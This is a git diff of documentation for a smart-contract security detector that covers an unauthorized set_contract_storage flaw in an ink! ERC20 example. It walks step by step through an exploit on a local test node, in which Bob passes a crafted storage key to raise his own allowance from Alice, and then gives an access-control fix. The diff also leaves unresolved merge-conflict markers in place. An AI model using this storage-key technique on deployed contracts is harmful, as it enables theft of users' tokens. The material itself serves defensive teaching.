@@ -1,19 +1,29 @@
 # Set Contract Storage
 
-## Configuration
-
-* Detector ID: `set-contract-storage`
-* Analysis Category: `Authorization`
-* Severity: `High`
-
 ## Description
+- Vulnerability Category: `Authorization`
+- Severity: `High`
+- Detector ID: `set-contract-storage`
 
-Functions using keys as variables without proper access control or input sanitation can allow users to perform changes in arbitrary memory locations.
-In this example, we see how this vulnerability can be exploited to change a user's allowance in an ERC20 contract.
+Smart contract can store important information in memory which changes 
+through the contract's lifecycle. Changes happen via user interaction with 
+the smart contract. An _unauthorized set contract storage_ vulnerability 
+happens when a smart contract call allows a user to set or modify contract 
+memory when he was not supposed to be authorized.
+
+In this example, we see how this vulnerability can be exploited to change a 
+user's allowance in an [ERC20](https://ethereum.org/en/developers/docs/standards/tokens/erc-20/)
+contract.
 
 ## Exploit Scenario
+<<<<<<< HEAD
 
 In this snippet we see insufficient access control for the `set_contract_storage()` function.
+=======
+In this example we see that any user may access the 
+`set_contract_storage()` function, and therefore modify the value for any key
+arbitrarily.
+>>>>>>> documentation_branch
 
 ```rust
 #[ink::trait_definition]
@@ -35,7 +45,6 @@ impl MisusedSetContractStorage for Erc20 {
 The full code can be found [here](vulnerable-example/lib.rs).
 
 ### Deployment
-
 To compile this example, `cargo-contract` v2.0.1 (or above) is required.
 
 In order to run this exploit, [download](https://github.com/paritytech/substrate-contracts-node/releases), unzip and run a substrate node with `./substrate-contract-node`. Download the contents of the `example` folder associated to this detector and compile the contract running `cargo contract build` and build the binary.
@@ -64,7 +73,9 @@ user:example$ cargo contract upload --suri //Alice ./target/ink/my_contract.cont
    Code hash "0xacb7ab745fa131cf8a8eb0f5bb2d98f88ea186da39dee2e80b1289bcfd9d7f25"
 ```
 
-Instantiate the uploaded smart contract with 100000 tokens from `Alice` running `cargo contract instantiate --args 100000 --suri //Alice`, press `y` and `[Enter]`.
+Instantiate the uploaded smart contract with 100000 tokens from `Alice` running
+`cargo contract instantiate --args 100000 --suri //Alice`, press `y` and 
+`[Enter]`.
 
 ```bash
 user:example$ cargo contract instantiate --args 100000 --suri //Alice
@@ -115,9 +126,16 @@ Submit? (Y/n): y
 
 ```
 
-Notice that, in this case, the contract address is `5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf`. For Alice, her address is by default `5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY` and Bob's address is `5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty`.
+Notice that, in this case, the contract address is 
+`5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf`. 
+For Alice, her address is by default 
+`5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY` and Bob's address is 
+`5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty`.
 
-You can get Alice's allowance for Bob with the following command `cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::allowance --args 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty --suri //Alice --dry-run`. Make sure to replace the contract address with the one you obtained. In this case, you will see that the allowance is set to zero.
+You can get Alice's allowance for Bob with the following command 
+`cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::allowance --args 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty --suri //Alice --dry-run`. 
+Make sure to replace the contract address with the one you obtained. In this 
+case, you will see that the allowance is set to zero.
 
 ```bash
 user:example$ cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::allowance --args 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty --suri //Alice --dry-run
@@ -127,7 +145,9 @@ user:example$ cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2um
 
 ```
 
-Alice can approve a higher allowance for Bob using the `approve()` function with the command `cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::approve --args 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty 10 --suri //Alice`.
+Alice can approve a higher allowance for Bob using the `approve()` function
+with the command 
+`cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::approve --args 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty 10 --suri //Alice`.
 
 ```bash
 user:example$ cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::approve --args 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty 10 --suri //Alice
@@ -163,7 +183,12 @@ Submit? (Y/n): y
          dispatch_info: DispatchInfo { weight: Weight { ref_time: 3485758564, proof_size: 30498 }, class: Normal, pays_fee: Yes }
 ```
 
-Let's assume Bob is a malicious user and he wants to set a higher allowance for himself without Alice's approval. Taking a look at the smart contract, he notices that the function `misused_set_contract_storage()` has no access control validation and uses the `set_contract_storage()` function. Working on the input of this function, he could change the contract's storage and his allowance.
+Let us assume Bob is a malicious user and he wants to set a higher allowance
+for himself without Alice's approval. Taking a look at the smart contract, 
+he notices that the function `misused_set_contract_storage()` has no access 
+control validation and uses the `set_contract_storage()` function. Working on 
+the input of this function, he could change the contract's storage and his 
+allowance.
 
 In order to do this, he runs the following command `cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message MisusedSetContractStorage::misused_set_contract_storage --args [255,0,0,0,212,53,147,199,21,253,211,28,97,20,26,189,4,169,159,214,130,44,133,88,133,76,205,227,154,86,132,231,165,109,162,125,142,175,4,21,22,135,115,99,38,201,254,161,126,37,252,82,135,97,54,147,201,18,144,156,178,38,170,71,148,242,106,72] 1000000 --suri //Bob`.
 
@@ -200,22 +225,28 @@ user:example$ cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2um
         Data Ok(1000000)
 ```
 
-Breaking down the used key `[255,0,0,0,212,53,147,199,21,253,211,28,97,20,26,189,4,169,159,214,130,44,133,88,133,76,205,227,154,86,132,231,165,109,162,125,142,175,4,21,22,135,115,99,38,201,254,161,126,37,252,82,135,97,54,147,201,18,144,156,178,38,170,71,148,242,106,72]`, we notice that:
-* `[255,0,0,0]` stands for allowances mapping.
-* `[212,53,147,199,21,253,211,28,97,20,26,189,4,169,159,214,130,44,133,88,133,76,205,227,154,86,132,231,165,109,162,125]` corresponds, byte by byte, to Alice's address `5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY`.
-* `[142,175,4,21,22,135,115,99,38,201,254,161,126,37,252,82,135,97,54,147,201,18,144,156,178,38,170,71,148,242,106,72]` corresponds, bytye by byte, to Bob's address `5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty`.
-
-
-### Tutorial
-
-See this [tutorial](https://drive.google.com/file/d/1jXZNBy_TmJbPhDYSzZSSMGmm9-NGVGzE/view?usp=share_link) (in Spanish) showing this exploit in action. Tutorial starts at min 10:30.
+Breaking down the used key `[255,0,0,0,212,53,147,199,21,253,211,28,97,20,26,189,4,169,159,214,130,44,133,88,133,76,205,227,154,86,132,231,165,109,162,125,142,175,4,21,22,135,115,99,38,201,254,161,126,37,252,82,135,97,54,147,201,18,144,156,178,38,170,71,148,242,106,72]`, 
+we note that:
+- `[255,0,0,0]` stands for allowances mapping.
+- `[212,53,147,199,21,253,211,28,97,20,26,189,4,169,159,214,130,44,133,88,133,76,205,227,154,86,132,231,165,109,162,125]` corresponds, byte by byte, to Alice's address `5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY`.
+- `[142,175,4,21,22,135,115,99,38,201,254,161,126,37,252,82,135,97,54,147,201,18,144,156,178,38,170,71,148,242,106,72]` corresponds, byte by byte, to Bob's address `5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty`.
 
 ## Remediation
+Arbitrary users should not have control over keys because it implies writing 
+any value of a mapping, lazy variable, or the main struct of the contract 
+located in position 0 of the storage. 
+To prevent this issue, set access control and proper authorization validation 
+for the `set_contract_storage()` function. 
 
+<<<<<<< HEAD
 Abitrary users should not have control over keys because it implies writing any value of a mapping, lazy variable, or the main struct of the contract located in position 0 of the storage.
 Set access control and proper authorization validation for the `set_contract_storage()` function.
 
 In this case, ensure only the owner (or desired account) can call `misused_set_contract_storage()`.
+=======
+For example, the code below, ensures only the owner can call 
+`misused_set_contract_storage()`.
+>>>>>>> documentation_branch
 
 ```rust
 #[ink(message)]
@@ -229,7 +260,10 @@ fn misused_set_contract_storage(&mut self, user_input_key: [u8; 68], user_input_
 }
 ```
 
+<<<<<<< HEAD
 The full code can be found [here](remediated-example/lib.rs).
+=======
+>>>>>>> documentation_branch
 
 ## References
 * https://use.ink/datastructures/storage-layout
